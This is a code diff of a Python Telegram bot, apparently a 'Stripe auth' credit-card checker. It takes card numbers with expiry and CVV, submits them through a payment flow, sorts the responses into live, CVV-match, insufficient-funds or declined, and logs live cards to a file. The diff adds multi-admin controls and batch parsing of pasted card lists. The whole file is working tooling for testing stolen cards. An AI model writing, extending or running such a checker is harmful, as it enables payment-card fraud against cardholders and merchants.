@@ -15,10 +15,26 @@ from telegram.ext import (
     ContextTypes,
 )
 
-# Ganti dengan chat ID kamu sendiri
-ADMIN_CHAT_ID = 7519839885
+# ================= CONFIG ===================
+OWNER_ADMIN_ID = 7519839885  # REPLACE WITH YOUR TELEGRAM USER ID (OWNER ADMIN)
+ADMIN_ID_FILE = "admin_ids.txt"
+# ============================================
 
-# Helper function to extract substring between start and end
+def get_admin_chat_ids() -> set[int]:
+    if os.path.exists(ADMIN_ID_FILE):
+        with open(ADMIN_ID_FILE, "r") as f:
+            ids = {int(line.strip()) for line in f if line.strip().isdigit()}
+        return ids
+    return set()
+
+def save_admin_chat_ids(admins: set[int]) -> None:
+    with open(ADMIN_ID_FILE, "w") as f:
+        for aid in admins:
+            f.write(f"{aid}\n")
+
+admin_chat_ids = get_admin_chat_ids()
+
+# HELPER FUNCTION TO EXTRACT SUBSTRING BETWEEN START AND END
 def gets(s: str, start: str, end: str) -> str | None:
     try:
         start_index = s.index(start) + len(start)
@@ -27,12 +43,12 @@ def gets(s: str, start: str, end: str) -> str | None:
     except ValueError:
         return None
 
-# Create payment method with expiry validation
+# CREATE PAYMENT METHOD WITH EXPIRY VALIDATION
 async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
     try:
         cc, mes, ano, cvv = fullz.split("|")
 
-        # Validate expiration date
+        # VALIDATE EXPIRATION DATE
         mes = mes.zfill(2)
         if len(ano) == 4:
             ano = ano[-2:]
@@ -44,14 +60,14 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
             expiry_month = int(mes)
             expiry_year = int(ano)
         except ValueError:
-            return json.dumps({"error": {"message": "Invalid expiry date"}})
+            return json.dumps({"error": {"message": "INVALID EXPIRY DATE"}})
 
         if expiry_month < 1 or expiry_month > 12:
-            return json.dumps({"error": {"message": "Expiration Month Invalid"}})
+            return json.dumps({"error": {"message": "EXPIRATION MONTH INVALID"}})
         if expiry_year < current_year:
-            return json.dumps({"error": {"message": "Expiration Year Invalid"}})
+            return json.dumps({"error": {"message": "EXPIRATION YEAR INVALID"}})
         if expiry_year == current_year and expiry_month < current_month:
-            return json.dumps({"error": {"message": "Expiration Month Invalid"}})
+            return json.dumps({"error": {"message": "EXPIRATION MONTH INVALID"}})
 
         headers = {
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -235,18 +251,18 @@ async def create_payment_method(fullz: str, session: httpx.AsyncClient) -> str:
         return response.text
 
     except Exception as e:
-        return f"Exception: {str(e)}"
+        return f"EXCEPTION: {str(e)}"
 
-# Function maps API response text to friendly message
+# FUNCTION MAPS API RESPONSE TEXT TO FRIENDLY MESSAGE
 async def charge_resp(result):
     try:
         if (
             '{"status":"SUCCESS",' in result
             or '"status":"success"' in result
         ):
-            response = "Payment method successfully added ✅"
+            response = "PAYMENT METHOD SUCCESSFULLY ADDED ✅"
         elif "Thank you for your donation" in result:
-            response = "Payment successful! 🎉"
+            response = "PAYMENT SUCCESSFUL! 🎉"
         elif "insufficient funds" in result or "card has insufficient funds." in result:
             response = "INSUFFICIENT FUNDS ✅"
         elif "Your card has insufficient funds." in result:
@@ -268,9 +284,9 @@ async def charge_resp(result):
             or "card_error_authentication_required" in result
             or "wcpay-confirm-pi:" in result
         ):
-            response = "3DS Required ❎"
+            response = "3DS REQUIRED ❎"
         elif "stripe_3ds2_fingerprint" in result:
-            response = "3DS Required ❎"
+            response = "3DS REQUIRED ❎"
         elif "Your card does not support this type of purchase." in result:
             response = "CARD DOESN'T SUPPORT THIS PURCHASE ❎"
         elif (
@@ -326,21 +342,21 @@ async def charge_resp(result):
             or "api_key_expired" in result
             or "Your account cannot currently make live charges." in result
         ):
-            response = "stripe error contact support@stripe.com for more details ❌"
+            response = "STRIPE ERROR, CONTACT SUPPORT@STRIPE.COM FOR DETAILS ❌"
         elif "Your card was declined." in result or "card was declined" in result:
             response = "CARD DECLINED ❌"
         elif "card number is incorrect." in result:
             response = "CARD NUMBER INCORRECT ❌"
         elif "Sorry, we are unable to process your payment at this time. Please retry later." in result:
-            response = "Sorry, we are unable to process your payment at this time. Please retry later ⏳"
+            response = "SORRY, PAYMENT CANNOT BE PROCESSED AT THIS TIME. PLEASE RETRY LATER ⏳"
         elif "card number is incomplete." in result:
             response = "CARD NUMBER INCOMPLETE ❌"
         elif "The order total is too high for this payment method" in result:
-            response = "ORDER TO HIGH FOR THIS CARD ❌"
+            response = "ORDER TOO HIGH FOR THIS CARD ❌"
         elif "The order total is too low for this payment method" in result:
-            response = "ORDER TO LOW FOR THIS CARD ❌"
+            response = "ORDER TOO LOW FOR THIS CARD ❌"
         elif "Please Update Bearer Token" in result:
-            response = "Token Expired Admin Has Been Notified ❌"
+            response = "TOKEN EXPIRED, ADMIN HAS BEEN NOTIFIED ❌"
         else:
             response = result + "❌"
             with open("result_logs.txt", "a", encoding="utf-8") as f:
@@ -350,7 +366,7 @@ async def charge_resp(result):
     except Exception as e:
         return f"{str(e)} ❌"
 
-# Combines create_payment_method + charge_resp + measure time
+# COMBINES create_payment_method + charge_resp + MEASURE TIME
 async def multi_checking(fullz: str) -> str:
     start = time.time()
     async with httpx.AsyncClient(timeout=40) as session:
@@ -381,41 +397,127 @@ async def multi_checking(fullz: str) -> str:
             f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲: » {response}\n"
             f"𝗧𝗶𝗺𝗲: » {elapsed}s"
         )
-        if any(key in response for key in ["Payment method successfully added", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
+        if any(key in response for key in ["PAYMENT METHOD SUCCESSFULLY ADDED", "CVV INCORRECT", "CVV MATCH", "INSUFFICIENT FUNDS"]):
             with open("auth.txt", "a", encoding="utf-8") as file:
                 file.write(output + "\n")
 
     return output
 
-# Telegram bot handlers
+# TELEGRAM BOT HANDLERS
 
 TELEGRAM_BOT_TOKEN = os.getenv("TOKEN")
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if update.effective_chat.id != ADMIN_CHAT_ID:
+    chat_id = update.effective_chat.id
+    global admin_chat_ids
+
+    if not admin_chat_ids:
+        if chat_id == OWNER_ADMIN_ID:
+            admin_chat_ids.add(chat_id)
+            save_admin_chat_ids(admin_chat_ids)
+            await update.message.reply_text(
+                f"HI OWNER ADMIN! YOUR ADMIN ID IS NOW REGISTERED.\n"
+                "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
+                "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
+            )
+        else:
+            await update.message.reply_text("BOT IS NOT CONFIGURED YET, ONLY OWNER ADMIN CAN REGISTER FIRST.")
+        return
+
+    if chat_id not in admin_chat_ids:
         await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
         return
+
     await update.message.reply_text(
         "𝗦𝗧𝗥𝗜𝗣𝗘 𝗔𝗨𝗧𝗛\n"
         "SEND CARD IN FORMAT » CC|MM|YY|CVV\n"
     )
 
+
+async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    chat_id = update.effective_chat.id
+    global admin_chat_ids
+
+    if chat_id != OWNER_ADMIN_ID:
+        await update.message.reply_text("ONLY OWNER ADMIN CAN ADD ANOTHER ADMIN. ❌")
+        return
+
+    if not context.args or len(context.args) != 1:
+        await update.message.reply_text("/addadmin <user_id>")
+        return
+
+    try:
+        new_admin_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
+        return
+
+    if new_admin_id in admin_chat_ids:
+        await update.message.reply_text(f"USER ID {new_admin_id} IS ALREADY AN ADMIN.")
+        return
+
+    admin_chat_ids.add(new_admin_id)
+    save_admin_chat_ids(admin_chat_ids)
+    await update.message.reply_text(f"USER ID {new_admin_id} HAS BEEN SUCCESSFULLY ADDED AS ADMIN!")
+
+
+async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
+    chat_id = update.effective_chat.id
+    global admin_chat_ids
+
+    if chat_id != OWNER_ADMIN_ID:
+        await update.message.reply_text("ONLY OWNER ADMIN CAN REMOVE AN ADMIN. ❌")
+        return
+
+    if not context.args or len(context.args) != 1:
+        await update.message.reply_text("/deladmin <user_id>")
+        return
+
+    try:
+        remove_admin_id = int(context.args[0])
+    except ValueError:
+        await update.message.reply_text("INVALID USER ID, MUST BE A NUMBER.")
+        return
+
+    if remove_admin_id not in admin_chat_ids:
+        await update.message.reply_text(f"USER ID {remove_admin_id} IS NOT AN ADMIN.")
+        return
+
+    if remove_admin_id == OWNER_ADMIN_ID:
+        await update.message.reply_text("YOU CANNOT REMOVE YOURSELF AS OWNER ADMIN. ❌")
+        return
+
+    admin_chat_ids.remove(remove_admin_id)
+    save_admin_chat_ids(admin_chat_ids)
+    await update.message.reply_text(f"USER ID {remove_admin_id} HAS BEEN REMOVED FROM ADMINS.")
+
+
 async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
-    if update.effective_chat.id != ADMIN_CHAT_ID:
+    if update.effective_chat.id not in admin_chat_ids:
         await update.message.reply_text("YOU ARE NOT AUTHORIZED TO USE THIS BOT ❌")
         return
 
     text = update.message.text.strip()
-    lines = [line.strip() for line in text.splitlines() if line.strip()]
+
+    # SPLIT INPUT CARD DATA BY LINES AND SPACES
+    raw_cards = []
+    for line in text.splitlines():
+        for part in line.strip().split():
+            if part:
+                raw_cards.append(part.strip())
+
+    if not raw_cards:
+        await update.message.reply_text("NO CARD DATA FOUND IN MESSAGE.")
+        return
 
     msg = await update.message.reply_text("PROCESSING YOUR CARD, PLEASE WAIT...", parse_mode='HTML')
 
     try:
-        for line in lines:
-            parts = line.split("|")
+        for fullz in raw_cards:
+            parts = fullz.split("|")
             if len(parts) != 4:
                 await update.message.reply_text(
-                    f"WRONG FORMAT:\n<code>{line}</code>\nUSE FORMAT: CC|MM|YYYY|CVV",
+                    f"WRONG FORMAT:\n<code>{fullz}</code>\nUSE FORMAT CC|MM|YYYY|CVV",
                     parse_mode='HTML'
                 )
                 continue
@@ -426,24 +528,29 @@ async def handle_cc_message(update: Update, context: ContextTypes.DEFAULT_TYPE) 
 
             cc_formatted = f"{cc_num}|{month}|{year}|{cvv}"
 
-            # Optional sleep if you want to add delay (can be removed for speed)
+            # OPTIONAL DELAY FOR RATE LIMITING - CAN DISABLE IF WANT FASTER
             await asyncio.sleep(3)
 
             result = await multi_checking(cc_formatted)
             await update.message.reply_text(result, parse_mode='HTML')
 
         await msg.delete()
+
     except Exception as e:
         await update.message.reply_text(f"ERROR: {str(e)}")
+
 
 def main() -> None:
     application = ApplicationBuilder().token(TELEGRAM_BOT_TOKEN).build()
 
     application.add_handler(CommandHandler("start", start))
+    application.add_handler(CommandHandler("addadmin", addadmin))
+    application.add_handler(CommandHandler("deladmin", deladmin))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), handle_cc_message))
 
     print("PARAEL CHECKER BOT RUNNING...")
     application.run_polling()
+
 
 if __name__ == "__main__":
     main()
